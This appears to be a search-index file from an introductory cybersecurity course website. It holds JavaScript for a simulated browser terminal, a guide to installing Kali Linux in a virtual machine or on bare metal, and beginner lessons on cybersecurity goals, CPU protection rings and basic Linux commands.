return []; }, 'mv': () => { if (args.length < 2) { term.writeln('\\x1b[31mUsage: mv <source> <destination>\\x1b[0m'); return []; } const srcPath = resolvePath(args[0]); const dstPath = resolvePath(args[1]); const srcParts = srcPath.split('/').filter(p => p); const srcName = srcParts.pop(); const srcParentPath = '/' + srcParts.join('/'); const dstParts = dstPath.split('/').filter(p => p); const dstName = dstParts.pop(); const dstParentPath = '/' + dstParts.join('/'); const srcParent = getObjectAtPath(srcParentPath || '/'); const dstParent = getObjectAtPath(dstParentPath || '/'); if (srcParent && srcParent[srcName] !== undefined && dstParent && isDirectory(dstParent)) { dstParent[dstName] = srcParent[srcName]; delete srcParent[srcName]; term.writeln(`\\x1b[32m'${args[0]}' moved to '${args[1]}'\\x1b[0m`); } else { term.writeln(`\\x1b[31mmv: cannot move '${args[0]}' to '${args[1]}'\\x1b[0m`); } return []; }, 'cp': () => { if (args.length < 2) { term.writeln('\\x1b[31mUsage: cp <source> <destination>\\x1b[0m'); return []; } const srcPath = resolvePath(args[0]); const dstPath = resolvePath(args[1]); const srcParts = srcPath.split('/').filter(p => p); const srcName = srcParts.pop(); const srcParentPath = '/' + srcParts.join('/'); const dstParts = dstPath.split('/').filter(p => p); const dstName = dstParts.pop(); const dstParentPath = '/' + dstParts.join('/'); const srcParent = getObjectAtPath(srcParentPath || '/'); const dstParent = getObjectAtPath(dstParentPath || '/'); if (srcParent && srcParent[srcName] !== undefined && dstParent && isDirectory(dstParent)) { if (typeof srcParent[srcName] === 'string') { dstParent[dstName] = srcParent[srcName]; term.writeln(`\\x1b[32m'${args[0]}' copied to '${args[1]}'\\x1b[0m`); } else { term.writeln(`\\x1b[31mcp: ${args[0]}: Is a directory (directory copy not implemented)\\x1b[0m`); } } else { term.writeln(`\\x1b[31mcp: cannot copy '${args[0]}' to '${args[1]}'\\x1b[0m`); } return []; }, 'grep': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: grep <pattern> [file] or <command> | grep <pattern>\\x1b[0m'); return []; } const pattern = args[0]; let searchLines = []; if (pipeInput !== null) { searchLines = pipeInput; } else if (args[1]) { const path = resolvePath(args[1]); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || '/'); if (dir && typeof dir[fileName] === 'string') { searchLines = dir[fileName].split('\\n'); } } const output = searchLines.filter(line => line.toLowerCase().includes(pattern.toLowerCase()) ); output.forEach(line => term.writeln(line)); return output; }, 'find': () => { const searchName = args[0] || ''; const output = []; function searchDir(path, obj) { if (!isDirectory(obj)) return; for (const [name, value] of Object.entries(obj)) { const fullPath = path + (path === '/' ? '' : '/') + name; if (name.includes(searchName)) { output.push(fullPath); term.writeln(fullPath); } if (isDirectory(value)) { searchDir(fullPath, value); } } } searchDir('/', fileSystem['/']); return output; }, 'echo': () => { const output = [args.join(' ')]; term.writeln(output[0]); return output; }, 'vim': () => { if (args.length === 0) { term.writeln('\\x1b[31mUsage: vim <filename>\\x1b[0m'); return []; } vimFilename = args[0]; const path = resolvePath(vimFilename); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir && dir[fileName] !== undefined) { if (typeof dir[fileName] === 'string') { vimBuffer = dir[fileName].split('\\n'); } else { term.writeln(`\\x1b[31mvim: ${vimFilename}: Is a directory\\x1b[0m`); return []; } } else { vimBuffer = ['']; } vimMode = true; vimInsertMode = false; vimCommandMode = false; vimCommandLine = ''; vimCurrentLine = 0; displayVim(); return []; } }; if (commands[command]) { return commands[command](); } else { term.writeln(`\\x1b[31m${command}: command not found\\x1b[0m`); return []; } } function displayVim() { term.clear(); vimBuffer.forEach((line, i) => { if (i === vimCurrentLine && !vimCommandMode) { term.writeln(`\\x1b[7m${line || ' '}\\x1b[0m`); } else { term.writeln(line); } }); term.write('\\r\\n'); const mode = vimInsertMode ? '-- INSERT --' : (vimCommandMode ? '' : '-- NORMAL --'); const status = `\\x1b[7m ${vimFilename} [${vimBuffer.length} lines] ${mode} \\x1b[0m`; term.writeln(status); if (!vimInsertMode && !vimCommandMode) { term.writeln('\\x1b[33m[i=insert, j/k=move, :w=save, :q=quit, :wq=save&quit]\\x1b[0m'); } if (vimCommandMode) { term.write(':' + vimCommandLine); } } function handleVimInput(key, domEvent) { if (vimCommandMode) { if (domEvent.key === 'Enter') { term.write('\\r\\n'); if (vimCommandLine === 'w' || vimCommandLine === 'wq') { const path = resolvePath(vimFilename); const pathParts = path.split('/').filter(p => p); const fileName = pathParts.pop(); const dirPath = '/' + pathParts.join('/'); const dir = getObjectAtPath(dirPath || currentPath); if (dir) { dir[fileName] = vimBuffer.join('\\n'); term.writeln(`\\x1b[32m\"${vimFilename}\" ${vimBuffer.length} lines written\\x1b[0m`); } } if (vimCommandLine === 'q' || vimCommandLine === 'wq' || vimCommandLine === 'q!') { vimMode = false; setTimeout(() => { term.clear(); writePrompt(); }, vimCommandLine === 'wq' ? 800 : 0); } else { setTimeout(() => displayVim(), 1000); } vimCommandMode = false; vimCommandLine = ''; } else if (domEvent.key === 'Escape') { vimCommandMode = false; vimCommandLine = ''; displayVim(); } else if (domEvent.key === 'Backspace') { if (vimCommandLine.length > 0) { vimCommandLine = vimCommandLine.slice(0, -1); displayVim(); } } else if (key.length === 1) { vimCommandLine += key; displayVim(); } } else if (!vimInsertMode) { if (key === 'i') { vimInsertMode = true; displayVim(); } else if (key === 'j' && vimCurrentLine < vimBuffer.length - 1) { vimCurrentLine++; displayVim(); } else if (key === 'k' && vimCurrentLine > 0) { vimCurrentLine--; displayVim(); } else if (key === ':') { vimCommandMode = true; displayVim(); } } else { if (domEvent.key === 'Escape') { vimInsertMode = false; displayVim(); } else if (domEvent.key === 'Enter') { vimBuffer.splice(vimCurrentLine + 1, 0, ''); vimCurrentLine++; displayVim(); } else if (domEvent.key === 'Backspace') { if (vimBuffer[vimCurrentLine].length > 0) { vimBuffer[vimCurrentLine] = vimBuffer[vimCurrentLine].slice(0, -1); } else if (vimCurrentLine > 0) { vimBuffer.splice(vimCurrentLine, 1); vimCurrentLine--; } displayVim(); } else if (key.length === 1) { vimBuffer[vimCurrentLine] = (vimBuffer[vimCurrentLine] || '') + key; displayVim(); } } } term.onKey(function(e) { if (vimMode) { handleVimInput(e.key, e.domEvent); return; } const ev = e.domEvent; const printable = !ev.altKey && !ev.ctrlKey && !ev.metaKey; if (ev.key === 'Enter') { term.write('\\r\\n'); if (currentLine.trim()) { commandHistory.push(currentLine.trim()); historyIndex = commandHistory.length; processCommand(currentLine.trim()); } currentLine = ''; if (!vimMode) { writePrompt(); } } else if (ev.key === 'Backspace') { if (currentLine.length > 0) { currentLine = currentLine.slice(0, -1); term.write('\\b \\b'); } } else if (ev.key === 'ArrowUp') { if (historyIndex > 0) { historyIndex--; replaceCurrentLine(commandHistory[historyIndex]); } } else if (ev.key === 'ArrowDown') { if (historyIndex < commandHistory.length - 1) { historyIndex++; replaceCurrentLine(commandHistory[historyIndex]); } else { historyIndex = commandHistory.length; replaceCurrentLine(''); } } else if (ev.key === 'Tab') { ev.preventDefault(); } else if (printable) { currentLine += e.key; term.write(e.key); } }); function replaceCurrentLine(newLine) { term.write('\\r'); writePrompt(); term.write(' '.repeat(currentLine.length)); term.write('\\r'); writePrompt(); currentLine = newLine; term.write(currentLine); } }, 100); })();","title":"Terminal"},{"location":"unit1/","text":"UNIT 1: Introduction to Linux and the Field of Cybersecurity Welcome to Cybersecurity! This was the unit we covered in our early meetings, but essentially this unit covers the basics of what Cybersecurity is all about, and a little intro to how to setup linux for the future, so in later lessons we can start applying what we learn on our machines! :) To begin, let's move on to Lesson 1.1","title":"Unit1"},{"location":"unit1/#unit-1-introduction-to-linux-and-the-field-of-cybersecurity","text":"Welcome to Cybersecurity! This was the unit we covered in our early meetings, but essentially this unit covers the basics of what Cybersecurity is all about, and a little intro to how to setup linux for the future, so in later lessons we can start applying what we learn on our machines! :) To begin, let's move on to Lesson 1.1","title":"UNIT 1: Introduction to Linux and the Field of Cybersecurity"},{"location":"unit2/","text":"","title":"Unit2"},{"location":"unit3/","text":"","title":"Unit3"},{"location":"LECTURES/unit1/installation-process/","text":"What is it? Kali is an operating system that was made specially for cybersecurity work (and hacking as well). It has a large toolkit of useful programs that we're going to learn about, including Hydra, Nmap, Wireshark, Tcpdump, MacChanger, Chisel, Aircrack-ng, etc. Some Vocab: As much as we know vocabulary might not be that interesting, it's important to know for the future, since there's a LOT of acronyms and words in cybersecurity that you're going to be hearing and using, so it's best to get used to it. Operating System (OS) : The main software that runs your computer, like Windows, macOS, iOS, GNU/Linux, etc. Virtual Machine (VM) : It's basically a computer inside another computer. You can run your regular OS, like Windows, and still have Kali Linux inside of it ISO File (International Organization for Standardization File) : Sounds fancy, but really it's just a full copy of an OS within one tiny file Hypervisor : Software that creates and manages VMs. Examples are VirtualBox and VMWare Workstation. There's also QEMU, but mostly Linux users use that, and you're likely running on Windows or mac Bootable USB : Just a USB drive (which you hopefully already know about) that can start up a computer and install an OS (we don't need this yet) Partitioning : A more advanced topic, but it's dividing up your drive into sections called partitions , which are like walls for a room. We don't need this yet, but it is good to know Now, let's get into the nitty-gritty: Method 1: Easy way :) Minimum Requirements*: 8 GB of RAM 20-30 GB of free hard drive space A decently fast CPU (you probably have this) *But, how do I know if I meet them? Well, you can press Ctrl+Shift+Esc on Windows and click on \"Performance\" inside of Task Manager, and it'll give you a spec (specifications) sheet. On mac, you can click on \"About\" in the top menu bar of your computer. On Linux, you can type uname -a , or use a custom program like fastfetch BIG DISCLAIMER FOR WINDOWS USERS: You NEED to DISABLE something called Hyper-V. If you don't know what that is, for Windows users, Hyper-V will conflict with Virtualbox, making it run poorly and crash often To check if you hve Hyper-V, press Win+R , and type optionalfeatures , then press Enter Look for a \"Hyper-V\" in the list of shown items. If it's checked, then it's enabled. Uncheck it. Alternative method: go to cmd (Command Prompt), and right click and \"Run as Administrator\". Then use the following command: bcdedit /set hypervisorlaunchtype off Finally, restart your computer BIG DISCLAIMER FOR MACOS USERS: You need to check if you're using an Intel-based Mac or Apple Silicon machine. If your device is M1, M2, M*, then it's Apple Silicon If this is the case, you will need to use a different software for virtualization. You have some options, like UTM or VMware Fusion . Also, you will have to install Kali Linux using the ARM64 version! Not x86-64! Now, go to virtualbox.org Click on the download for your OS, and install the program by following the instruction wizard. Now, go to the Kali Linux website . Download the \"Installer\" ISO file ( ~ 4 GB in size) Then choose the 64-bit version for modern computers. If your computer is old, it could be 32-bit. If so, you may need to check your system specifications as explained above. However, it probably isn't. Remember, Apple Silicon machines will install the ARM64 version of Kali Linux instead! Finally, make your Virtual Machine. Open up VirtualBox and click \"New\" Name it whatever, I'd call it \"Kali Linux\", or \"Kali Machine\". Type: Linux, Version: Debian (64-bit) Allocate at least 4 GB of RAM, AKA 4096 MB , by dragging the slider or typing in the number in the RAM text box Create a Virtual Hrd Disk (allocate 25-30 GB minimum) Choose VDI (VirtualBox Disk Image) Also select \"dynamically allocated\" to save space, and allows the VM to grow dynamically in storage size as you begin to add more things After clicking done, tell it to create, but do NOT tell it to also start yet Click on your virtual machine, and then go to settings Then go to Storage, and click the empty disk icon This is where we \"choose a disk file\", and select the downloaded Kali ISO Then under System, enable PAE/NX if available to you. PAE is Physical Address Extension, and NX is No Execute. These allow for > 4 GB of RAM access and prevents non-executable code from being executed in memory segments. If you don't know what that means, just ignore this Under Display, increase video memory to 128 MB Finally, save and exit Settings, and click on Start to boot your VM Select \"Graphical Install\" (press Enter, navigate using arrow keys) Choose your language, location, keyboard (these can later be changed, doesn't really matter) You can set a hostname, or keep the default (kali) IMPORTANT : username is kali and password is kali by default! Choose \"Guided - use entire disk\" for your partitioning Then select \"All files in one partition\" Confirm and wait a while. Take a walk outside, take a short nap, whatever you want. Just wait 10-20 minutes and it'll be done Restart when prompted On first login, enter the username and password Then, click the SUPER key ( Win key or Cmd key on mac) and type \"terminal\" or \"console\" into the search, and open the app In the terminal, you can type sudo apt update && sudo apt upgrade -y This command just updates your system When prompted with a password, type in your password Happy Linux! Method 2: Hard way (bare metal installation) Alright. You're ready for the real deal. No problem. WARNING! \u26a0\ufe0f\u26a0\ufe0f : This version of installation WILL take space on your disk! This means it will be physically installed, and it will NOT be installed as a VM! Just like Windows or macOS, it will be physically on your device. If you do this incorrectly, it may wipe your device completely . I'm not liable for if you mistakenly wipe your drive, it's up to you. Also, I personally do not recommend you install Kali Linux on a physical drive . If you want to use Linux for extra practice, install a distribution like Debian or Linux Mint . You are risking data loss if done incorrectly, so proceed at your own risk. Important things to note are: If you install on bare metal, AKA on your physical device, your device may have incompatibility issues. I would recommend doing your own research before doing so You may want to install Linux on a secondary drive, since if you use your main one, you will have to create a special partition for Linux to use exclusively, which is more difficult You'll need a USB drive with preferably 8 GB or more of storage You may need to adjust your BIOS (manufacturer specific, meaning it depends on what company made your computer and maybe even where you bought it from) to allow for other bootable devices, which can include removing Secure Boot There's some specifics for ARM64 machines like Apple Silicon that will be different! Overall, you are likely going to have to do your OWN research to make sure you don't mess anything up. Without further ado, these are some general instructions (not perfect): Create a bootable USB drive using an app like Balena Etcher or Rufus Make space on your hard drive by creating a disk partition of ~ 30 GB or more, or install on a secondary hard drive Boot from the USB drive from BIOS after restarting your computer and smashing the BIOS key as it boots up (typically Esc , F11 , F12 , or Del depending on the manufacturer) Follow the installation process, but make sure you select the right drive and if it's on the same disk as Windows or Mac, you install \"alongside\" it, not replace After going through the setup, you may re-enter the BIOS to change the boot order. What this means is move Linux above Windows so that on first boot you boot into Linux (optional) Some important extras: Make sure you regularly update your system at least weekly Make decent credentials or use a physical key Never just copy/paste a command without understanding it, look it up at least (even from me!) Install packages wisely and preferably from trusted sources Happy Linux! :)","title":"Linux Installation Process"},{"location":"LECTURES/unit1/installation-process/#what-is-it","text":"Kali is an operating system that was made specially for cybersecurity work (and hacking as well). It has a large toolkit of useful programs that we're going to learn about, including Hydra, Nmap, Wireshark, Tcpdump, MacChanger, Chisel, Aircrack-ng, etc.","title":"What is it?"},{"location":"LECTURES/unit1/installation-process/#some-vocab","text":"As much as we know vocabulary might not be that interesting, it's important to know for the future, since there's a LOT of acronyms and words in cybersecurity that you're going to be hearing and using, so it's best to get used to it. Operating System (OS) : The main software that runs your computer, like Windows, macOS, iOS, GNU/Linux, etc. Virtual Machine (VM) : It's basically a computer inside another computer. You can run your regular OS, like Windows, and still have Kali Linux inside of it ISO File (International Organization for Standardization File) : Sounds fancy, but really it's just a full copy of an OS within one tiny file Hypervisor : Software that creates and manages VMs. Examples are VirtualBox and VMWare Workstation. There's also QEMU, but mostly Linux users use that, and you're likely running on Windows or mac Bootable USB : Just a USB drive (which you hopefully already know about) that can start up a computer and install an OS (we don't need this yet) Partitioning : A more advanced topic, but it's dividing up your drive into sections called partitions , which are like walls for a room. We don't need this yet, but it is good to know Now, let's get into the nitty-gritty:","title":"Some Vocab:"},{"location":"LECTURES/unit1/installation-process/#method-1-easy-way","text":"","title":"Method 1: Easy way :)"},{"location":"LECTURES/unit1/installation-process/#minimum-requirements","text":"8 GB of RAM 20-30 GB of free hard drive space A decently fast CPU (you probably have this) *But, how do I know if I meet them? Well, you can press Ctrl+Shift+Esc on Windows and click on \"Performance\" inside of Task Manager, and it'll give you a spec (specifications) sheet. On mac, you can click on \"About\" in the top menu bar of your computer. On Linux, you can type uname -a , or use a custom program like fastfetch","title":"Minimum Requirements*:"},{"location":"LECTURES/unit1/installation-process/#big-disclaimer-for-windows-users","text":"You NEED to DISABLE something called Hyper-V. If you don't know what that is, for Windows users, Hyper-V will conflict with Virtualbox, making it run poorly and crash often To check if you hve Hyper-V, press Win+R , and type optionalfeatures , then press Enter Look for a \"Hyper-V\" in the list of shown items. If it's checked, then it's enabled. Uncheck it. Alternative method: go to cmd (Command Prompt), and right click and \"Run as Administrator\". Then use the following command: bcdedit /set hypervisorlaunchtype off Finally, restart your computer","title":"BIG DISCLAIMER FOR WINDOWS USERS:"},{"location":"LECTURES/unit1/installation-process/#big-disclaimer-for-macos-users","text":"You need to check if you're using an Intel-based Mac or Apple Silicon machine. If your device is M1, M2, M*, then it's Apple Silicon If this is the case, you will need to use a different software for virtualization. You have some options, like UTM or VMware Fusion . Also, you will have to install Kali Linux using the ARM64 version! Not x86-64! Now, go to virtualbox.org Click on the download for your OS, and install the program by following the instruction wizard. Now, go to the Kali Linux website . Download the \"Installer\" ISO file ( ~ 4 GB in size) Then choose the 64-bit version for modern computers. If your computer is old, it could be 32-bit. If so, you may need to check your system specifications as explained above. However, it probably isn't. Remember, Apple Silicon machines will install the ARM64 version of Kali Linux instead! Finally, make your Virtual Machine. Open up VirtualBox and click \"New\" Name it whatever, I'd call it \"Kali Linux\", or \"Kali Machine\". Type: Linux, Version: Debian (64-bit) Allocate at least 4 GB of RAM, AKA 4096 MB , by dragging the slider or typing in the number in the RAM text box Create a Virtual Hrd Disk (allocate 25-30 GB minimum) Choose VDI (VirtualBox Disk Image) Also select \"dynamically allocated\" to save space, and allows the VM to grow dynamically in storage size as you begin to add more things After clicking done, tell it to create, but do NOT tell it to also start yet Click on your virtual machine, and then go to settings Then go to Storage, and click the empty disk icon This is where we \"choose a disk file\", and select the downloaded Kali ISO Then under System, enable PAE/NX if available to you. PAE is Physical Address Extension, and NX is No Execute. These allow for > 4 GB of RAM access and prevents non-executable code from being executed in memory segments. If you don't know what that means, just ignore this Under Display, increase video memory to 128 MB Finally, save and exit Settings, and click on Start to boot your VM Select \"Graphical Install\" (press Enter, navigate using arrow keys) Choose your language, location, keyboard (these can later be changed, doesn't really matter) You can set a hostname, or keep the default (kali)","title":"BIG DISCLAIMER FOR MACOS USERS:"},{"location":"LECTURES/unit1/installation-process/#important-username-is-kali-and-password-is-kali-by-default","text":"Choose \"Guided - use entire disk\" for your partitioning Then select \"All files in one partition\" Confirm and wait a while. Take a walk outside, take a short nap, whatever you want. Just wait 10-20 minutes and it'll be done Restart when prompted On first login, enter the username and password Then, click the SUPER key ( Win key or Cmd key on mac) and type \"terminal\" or \"console\" into the search, and open the app In the terminal, you can type sudo apt update && sudo apt upgrade -y This command just updates your system When prompted with a password, type in your password Happy Linux!","title":"IMPORTANT: username is kali and password is kali by default!"},{"location":"LECTURES/unit1/installation-process/#method-2-hard-way-bare-metal-installation","text":"Alright. You're ready for the real deal. No problem. WARNING! \u26a0\ufe0f\u26a0\ufe0f : This version of installation WILL take space on your disk! This means it will be physically installed, and it will NOT be installed as a VM! Just like Windows or macOS, it will be physically on your device. If you do this incorrectly, it may wipe your device completely . I'm not liable for if you mistakenly wipe your drive, it's up to you. Also, I personally do not recommend you install Kali Linux on a physical drive . If you want to use Linux for extra practice, install a distribution like Debian or Linux Mint . You are risking data loss if done incorrectly, so proceed at your own risk. Important things to note are: If you install on bare metal, AKA on your physical device, your device may have incompatibility issues. I would recommend doing your own research before doing so You may want to install Linux on a secondary drive, since if you use your main one, you will have to create a special partition for Linux to use exclusively, which is more difficult You'll need a USB drive with preferably 8 GB or more of storage You may need to adjust your BIOS (manufacturer specific, meaning it depends on what company made your computer and maybe even where you bought it from) to allow for other bootable devices, which can include removing Secure Boot There's some specifics for ARM64 machines like Apple Silicon that will be different! Overall, you are likely going to have to do your OWN research to make sure you don't mess anything up. Without further ado, these are some general instructions (not perfect): Create a bootable USB drive using an app like Balena Etcher or Rufus Make space on your hard drive by creating a disk partition of ~ 30 GB or more, or install on a secondary hard drive Boot from the USB drive from BIOS after restarting your computer and smashing the BIOS key as it boots up (typically Esc , F11 , F12 , or Del depending on the manufacturer) Follow the installation process, but make sure you select the right drive and if it's on the same disk as Windows or Mac, you install \"alongside\" it, not replace After going through the setup, you may re-enter the BIOS to change the boot order. What this means is move Linux above Windows so that on first boot you boot into Linux (optional) Some important extras: Make sure you regularly update your system at least weekly Make decent credentials or use a physical key Never just copy/paste a command without understanding it, look it up at least (even from me!) Install packages wisely and preferably from trusted sources Happy Linux! :)","title":"Method 2: Hard way (bare metal installation)"},{"location":"LECTURES/unit1/lesson1-1/","text":"What do we know about Cybersecurity? Cybersecurity sounds like what it is exactly . Cyber, meaning digital, and security, meaning safety and protection. So digital protection/prevention/safety. But what does that really mean? Well you could say that cybersecurity is about how we can protect computers, servers, systems, etc. from digital attacks. These attacks oculd be viruses, worms, ransomware, etc. In order to keep sensitive data safe, we need to protect against the exploitation of security vulnerabilities. These are some cybersecurity goals: Identify and fix security vulnerabilities Prevent unauthorized access and data breaches Protect systems from malicious attacks Ensure integrity and availability of information Source: GeeksforGeeks","title":"Lesson 1.1"},{"location":"LECTURES/unit1/lesson1-1/#what-do-we-know-about-cybersecurity","text":"Cybersecurity sounds like what it is exactly . Cyber, meaning digital, and security, meaning safety and protection. So digital protection/prevention/safety. But what does that really mean? Well you could say that cybersecurity is about how we can protect computers, servers, systems, etc. from digital attacks. These attacks oculd be viruses, worms, ransomware, etc. In order to keep sensitive data safe, we need to protect against the exploitation of security vulnerabilities. These are some cybersecurity goals: Identify and fix security vulnerabilities Prevent unauthorized access and data breaches Protect systems from malicious attacks Ensure integrity and availability of information Source: GeeksforGeeks","title":"What do we know about Cybersecurity?"},{"location":"LECTURES/unit1/lesson1-2/","text":"Rings of Access Let's jump right into it! Protection rings are a hardware-level security feature on the CPU (Central Processing Unit) . When you think of CPU, think of that sticker you see on your laptop or PC that says Intel or AMD. That chip is a CPU, and it's in charge of managing important instructions on the computer. These \"rings\" determine the level of access from the operating system kernel (in this case the OS is Linux , which we'll talk about next lesson) to the user application. The most priviledged rings, where the most damage can be done the the most caution must be exercised, are the inner rings. The amount of priviledge provided grows as you approach the inner rings. The user typically resides in the outer most ring to do most of their applications. But with what we're going to be doing, we're going far deeper than the surface. The intermediate rings are for drivers to communicate between what the user does and what the kernel needs to do. What a kernel is is essentially just what controls the hardware itself at the lower level. Drivers are special software that translate a hardware device's instructions for the computer. For example, mouse movements, printers printing a document, graphics cards displaying something on screen, headphones or speakers, etc. The diagram below illustrates this: Source: Rings of Access Diagram But why this model? We use this to make sure when we run a command, we know how potentially impactful it could be. It prevents us from doing something not knowing it could destroy our system, and allows us to understand more intricately how the computer really is working. I know this doesn't sound like \"security\" yet, but we need to build our foundations first.","title":"Lesson 1.2"},{"location":"LECTURES/unit1/lesson1-2/#rings-of-access","text":"Let's jump right into it! Protection rings are a hardware-level security feature on the CPU (Central Processing Unit) . When you think of CPU, think of that sticker you see on your laptop or PC that says Intel or AMD. That chip is a CPU, and it's in charge of managing important instructions on the computer. These \"rings\" determine the level of access from the operating system kernel (in this case the OS is Linux , which we'll talk about next lesson) to the user application. The most priviledged rings, where the most damage can be done the the most caution must be exercised, are the inner rings. The amount of priviledge provided grows as you approach the inner rings. The user typically resides in the outer most ring to do most of their applications. But with what we're going to be doing, we're going far deeper than the surface. The intermediate rings are for drivers to communicate between what the user does and what the kernel needs to do. What a kernel is is essentially just what controls the hardware itself at the lower level. Drivers are special software that translate a hardware device's instructions for the computer. For example, mouse movements, printers printing a document, graphics cards displaying something on screen, headphones or speakers, etc. The diagram below illustrates this: Source: Rings of Access Diagram But why this model? We use this to make sure when we run a command, we know how potentially impactful it could be. It prevents us from doing something not knowing it could destroy our system, and allows us to understand more intricately how the computer really is working. I know this doesn't sound like \"security\" yet, but we need to build our foundations first.","title":"Rings of Access"},{"location":"LECTURES/unit1/lesson1-3/","text":"Intro to Linux & Commands What is Linux? What are commands? How do I do said commands? Fear not, that's what this lesson is all about! To begin, let's define a seemingly unrelated term: Operating Systems. An operating system is the software that supports the functions of your computer, like executing apps, controlling peripherals like a mouse or keyboard, and scheduling tasks like updates. Examples of this would be Windows 11/10, Linux, MacOS, BSD, Android, ChromeOS, UNIX, etc. We are focusing in on Linux, as Linux gives us the most freedom whilst also being relatively easier to learn that alternatives. By freedom, we mean that with Linux, we can get down to that kernel level access mentioned previously. But what flavor of Linux shall we use? For those who aren't familiar, there are different distributions, or distros of Linux. They're basically different versions of Linux that look and operate differently, but are fundamentally the same overall. The one we'll be using moving forwards is Kali Linux , which is specially designed for penetration testing (future topic) and is Debian-based (means it comes from the Debian version of Linux). Commands So...what exactly is a command? Well, if your parents tell you what to do, like chores, that's a command. Similarly, when we type commands into a terminal emulator , we command the computer to follow through with a sort of chore. But what's a terminal emulator? A terminal emulator is a big scary text box where we type commands in. That's it. ls -> lists files in current directory cat <file> -> spits out whats in the file in plain text mv <source> <destination> -> moves a file to a destination directory touch <file> -> makes the file grep <pattern> <file> -> searches for that pattern in the file. Like if a word appears in it man <command> -> linux manual for this command. How to do this command? help -> Gives you the list of available commands and other useful info sudo <command> -> Gives you super user do permissions. Do this as the admin. cp <source> <destination> -> copy a file to a destination directory cd <directory> -> change to this directory ls -a -> list ALL files, even the hidden ones rm <file> -> removes a file mkdir <directory> -> makes a new directory inside the current working one rm -rf <directory> -> removes all files recursively in a directory (so the directory and everything in it, including subdirectories) rmdir <directory> -> same thing as above command, but a different way of doing it cd -> if you just type \"cd\" it brings you to the home, or ~ directory. This is your starting point We'll be practicing these commands using a Virtual Machine , which is a pretend computer that uses a Virtual Disk. We do this so that we don't have to install on bare metal , which is just your actual computer. Assuming you have your schoolwork, games, and messaging apps and other important files on your main computer, we don't want to erase that. So, we use a Virtual Machine. Unless you want to dual-boot, which is a more advanced technique involving installing multiple operating systems on one computer, but that's a more advanced topic. For practice with commands, you can either run them in a VM, or do so here: Terminal Practice If you want to learn how to install Kali Linux, follow the installation process here: Linux Installation Process","title":"Lesson 1.3"},{"location":"LECTURES/unit1/lesson1-3/#intro-to-linux-commands","text":"What is Linux? What are commands? How do I do said commands? Fear not, that's what this lesson is all about! To begin, let's define a seemingly unrelated term: Operating Systems. An operating system is the software that supports the functions of your computer, like executing apps, controlling peripherals like a mouse or keyboard, and scheduling tasks like updates. Examples of this would be Windows 11/10, Linux, MacOS, BSD, Android, ChromeOS, UNIX, etc. We are focusing in on Linux, as Linux gives us the most freedom whilst also being relatively easier to learn that alternatives. By freedom, we mean that with Linux, we can get down to that kernel level access mentioned previously. But what flavor of Linux shall we use? For those who aren't familiar, there are different distributions, or distros of Linux. They're basically different versions of Linux that look and operate differently, but are fundamentally the same overall. The one we'll be using moving forwards is Kali Linux , which is specially designed for penetration testing (future topic) and is Debian-based (means it comes from the Debian version of Linux).","title":"Intro to Linux &amp; Commands"},{"location":"LECTURES/unit1/lesson1-3/#commands","text":"So...what exactly is a command? Well, if your parents tell you what to do, like chores, that's a command. Similarly, when we type commands into a terminal emulator , we command the computer to follow through with a sort of chore. But what's a terminal emulator? A terminal emulator is a big scary text box where we type commands in. That's it. ls -> lists files in current directory cat <file> -> spits out whats in the file in plain text mv <source> <destination> -> moves a file to a destination directory touch <file> -> makes the file grep <pattern> <file> -> searches for that pattern in the file. Like if a word appears in it man <command> -> linux manual for this command. How to do this command? help -> Gives you the list of available commands and other useful info sudo <command> -> Gives you super user do permissions. Do this as the admin. cp <source> <destination> -> copy a file to a destination directory cd <directory> -> change to this directory ls -a -> list ALL files, even the hidden ones rm <file> -> removes a file mkdir <directory> -> makes a new directory inside the current working one rm -rf <directory> -> removes all files recursively in a directory (so the directory and everything in it, including subdirectories) rmdir <directory> -> same thing as above command, but a different way of doing it cd -> if you just type \"cd\" it brings you to the home, or ~ directory. This is your starting point We'll be practicing these commands using a Virtual Machine , which is a pretend computer that uses a Virtual Disk. We do this so that we don't have to install on bare metal , which is just your actual computer. Assuming you have your schoolwork, games, and messaging apps and other important files on your main computer, we don't want to erase that. So, we use a Virtual Machine. Unless you want to dual-boot, which is a more advanced technique involving installing multiple operating systems on one computer, but that's a more advanced topic. For practice with commands, you can either run them in a VM, or do so here: Terminal Practice If you want to learn how to install Kali Linux, follow the installation process here: Linux Installation Process","title":"Commands"},{"location":"LECTURES/unit1/lesson1-4/","text":"Linux cont. Why Linux for Cybersecurity? You might be wondering: \"Why can't I just use Windows or Mac for security work?\" You technically can, but here's why Linux is the standard: Transparency : Because the source code is open, you can see exactly what the operating system is doing. No hidden processes, no mysterious telemetry. In security, you need to know what's happening under the hood. Control : Linux gives you complete control over your system. You can customize everything, remove anything, and configure it precisely for your needs. This is essential when you're working with security tools. Command Line Power : While Windows and Mac have command lines, Linux was built around it. The terminal is where you'll do most security work\u2014running scans, analyzing logs, automating tasks, and exploiting vulnerabilities. Server Dominance : Most servers on the internet run Linux. If you want to secure web applications, cloud infrastructure, or network services, you need to know Linux. Security Tools : The vast majority of cybersecurity tools are built for Linux first. Some are exclusive to Linux. Tools like Metasploit, Wireshark, Nmap, and Burp Suite all work best on Linux. Community : The Linux community is massive and helpful. When you run into problems (and you will), there's a wealth of documentation, forums, and resources available. Linux Distributions In More Depth Here's something interesting: there isn't just one \"Linux.\" There are hundreds of distributions (or \"distros\") of Linux, each designed for different purposes. A distribution is basically Linux packaged with different software, desktop environments, and configurations. Some popular distributions: - Ubuntu : Beginner-friendly, widely used, great for learning - Debian : Stable and reliable, the foundation for many other distros - Kali Linux : Specifically designed for penetration testing and security auditing (we'll use this a lot) - Parrot Security : Another security-focused distro with a focus on privacy - Arch Linux : Minimalist, requires manual configuration, teaches you how everything works - CentOS/RHEL : Enterprise-focused, common in corporate environments For this course, we'll primarily use Kali Linux because it comes pre-installed with hundreds of security tools. But the skills you learn apply to all Linux distributions. The Linux Philosophy Linux follows some core principles that shape how you'll interact with it: Everything is a file : In Linux, everything\u2014devices, processes, directories\u2014is treated as a file. This makes the system consistent and predictable. Small, focused tools : Instead of giant programs that do everything, Linux uses small programs that do one thing well. You combine them to accomplish complex tasks. Command-line first : The graphical interface is optional. The real power is in the terminal. User responsibility : Linux assumes you know what you're doing. It won't stop you from deleting critical system files or running dangerous commands. This freedom is powerful but requires caution. The File System Structure 